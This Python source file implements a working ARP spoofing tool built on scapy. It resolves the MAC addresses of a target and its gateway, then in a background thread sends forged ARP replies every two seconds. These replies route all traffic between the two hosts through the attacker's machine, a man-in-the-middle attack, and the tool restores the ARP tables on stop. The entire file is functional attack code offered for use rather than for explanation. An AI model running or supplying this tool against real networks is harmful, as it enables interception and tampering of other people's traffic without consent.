import time
import logging
import threading
from scapy.layers.l2 import ARP, Ether, getmacbyip
from scapy.all import srp, send, sendp, get_if_hwaddr

logger = logging.getLogger('ARPSpoofer')

# TODO: Colorama B) oha nd make the code cleaner B(


class ARPSpoofer:
    """
    ARP spoofing module
    """

    def __init__(self, interface, target_ip, gateway_ip, packet_handler=None):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.packet_handler = packet_handler
        self.running = False
        self.spoof_thread = None

        # Get OUR MAC address
        self.attacker_mac = get_if_hwaddr(interface)
        logger.info(f"Our MAC address: {self.attacker_mac}")

        # Get target and gateway MAC addresses
        self.target_mac = self._get_mac(target_ip)
        self.gateway_mac = self._get_mac(gateway_ip)

        if not self.target_mac:
            logger.error(f"Could not get MAC address for target {target_ip}")
            raise ValueError(f"Target {target_ip} not found on network")
        else:
            logger.info(f"Target MAC: {self.target_mac}")

        if not self.gateway_mac:
            logger.error(f"Could not get MAC address for gateway {gateway_ip}")
            raise ValueError(f"Gateway {gateway_ip} not found on network")
        else:
            logger.info(f"Gateway MAC: {self.gateway_mac}")

    def _get_mac(self, ip):
        """Get MAC address for an IP using ARP"""
        try:
            mac = getmacbyip(ip)
            if mac:
                return mac

            # Manual arp to get if scapy fails
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            response, _ = srp(arp_request, timeout=2, retry=3,
                              verbose=0, iface=self.interface)

            for _, packet in response:
                return packet[Ether].src

            return None
        except Exception as e:
            logger.error(f"Error getting MAC for {ip}: {e}")
            return None

    def _spoof(self):
        """Send ARP poison packets to target and gateway"""

        # Create poisoned ARP reply for target
        # This tells the target that WE are the gateway
        target_poison = ARP(
            op=2,  # ARP reply
            pdst=self.target_ip,  # Destination IP (target)
            hwdst=self.target_mac,  # Destination MAC (target)
            psrc=self.gateway_ip,  # We claim to be the gateway
            hwsrc=self.attacker_mac  # But with OUR MAC address B))
        )

        # Create poisoned ARP reply for gateway
        # This tells the gateway that WE are the target
        gateway_poison = ARP(
            op=2,  # ARP reply
            pdst=self.gateway_ip,  # Destination IP (gateway)
            hwdst=self.gateway_mac,  # Destination MAC (gateway)
            psrc=self.target_ip,  # We claim to be the target
            hwsrc=self.attacker_mac  # But with OUR MAC address B))
        )

        # Send the poisoned packets
        send(target_poison, verbose=0, iface=self.interface)
        send(gateway_poison, verbose=0, iface=self.interface)

        logger.debug(f"Sent ARP poison packets")

    def _restore_arp(self):
        """Restore normal ARP tables on target and gateway"""

        logger.info("Restoring ARP tables...")

        # Tell target the real MAC address of gateway
        target_restore = ARP(
            op=2,
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.gateway_ip,
            hwsrc=self.gateway_mac  # Real gateway MAC
        )

        # Tell gateway the real MAC address of target
        gateway_restore = ARP(
            op=2,
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac,
            psrc=self.target_ip,
            hwsrc=self.target_mac  # Real target MAC
        )

        # Send restore packets multiple times to ensure they're received
        for _ in range(5):
            send(target_restore, verbose=0, iface=self.interface, count=2)
            send(gateway_restore, verbose=0, iface=self.interface, count=2)
            time.sleep(0.5)

        logger.info("ARP tables restored")

    def _spoof_loop(self):
        """Main spoofing loop that runs in a thread"""
        try:
            while self.running:
                self._spoof()
                time.sleep(2)  # Send ARP poison every 2 seconds cause why not
        except Exception as e:
            logger.error(f"Error in ARP spoofing loop: {e}")
            self.running = False

    def start(self):
        """Start ARP spoofing"""
        if not self.target_mac or not self.gateway_mac:
            logger.error("Cannot start ARP spoofing without MAC addresses")
            return False

        self.running = True
        self.spoof_thread = threading.Thread(target=self._spoof_loop)
        self.spoof_thread.daemon = True
        self.spoof_thread.start()

        logger.info(
            f"ARP spoofing started: {self.target_ip} <-> {self.gateway_ip}")
        logger.info(
            f"All traffic between {self.target_ip} and {self.gateway_ip} will now pass through us")
        return True

    def stop(self):
        """Stop ARP spoofing and restore ARP tables"""
        logger.info("Stopping ARP spoofing...")
        self.running = False

        if self.spoof_thread:
            self.spoof_thread.join(timeout=3)

        self._restore_arp()
        logger.info("ARP spoofing stopped")
